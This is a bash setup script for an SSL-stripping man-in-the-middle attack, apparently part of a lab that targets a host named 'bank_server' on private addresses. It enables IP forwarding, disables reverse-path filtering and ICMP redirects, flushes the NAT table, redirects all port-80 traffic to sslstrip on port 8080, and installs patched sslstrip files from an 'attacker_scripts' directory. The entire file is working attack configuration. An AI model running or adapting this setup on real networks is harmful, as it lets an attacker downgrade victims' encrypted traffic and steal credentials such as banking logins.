#!/bin/bash

echo "[*] Enabling IP Forwarding..."
echo 1 > /proc/sys/net/ipv4/ip_forward

echo "[*] Disabling Reverse Path Filtering (Fix for 0 packet capture)..."
echo 0 > /proc/sys/net/ipv4/conf/all/rp_filter
echo 0 > /proc/sys/net/ipv4/conf/eth0/rp_filter

echo "[*] Disabling ICMP Redirects (Crucial for MITM)..."
echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects
echo 0 > /proc/sys/net/ipv4/conf/eth0/send_redirects
echo 0 > /proc/sys/net/ipv4/conf/default/send_redirects

echo "[*] Configuring iptables to redirect HTTP traffic (port 80) to sslstrip (port 8080)..."
# Flush existing nat rules to avoid duplicates
iptables -t nat -F
# Log for debugging
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j LOG --log-prefix "SSLSTRIP-HIT: "
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j DNAT --to-destination 172.28.0.10:8080

echo "[*] iptables configuration:"
iptables -t nat -L -v -n

echo "[*] Adding static DNS entry for bank_server..."
grep -q "bank_server" /etc/hosts || echo "172.28.0.20 bank_server" >> /etc/hosts

echo "[*] Patching SSLStrip for Python 3..."
cp -f /root/attacker_scripts/sslstrip_patches/*.py /usr/share/sslstrip/sslstrip/

echo "[+] Setup complete."
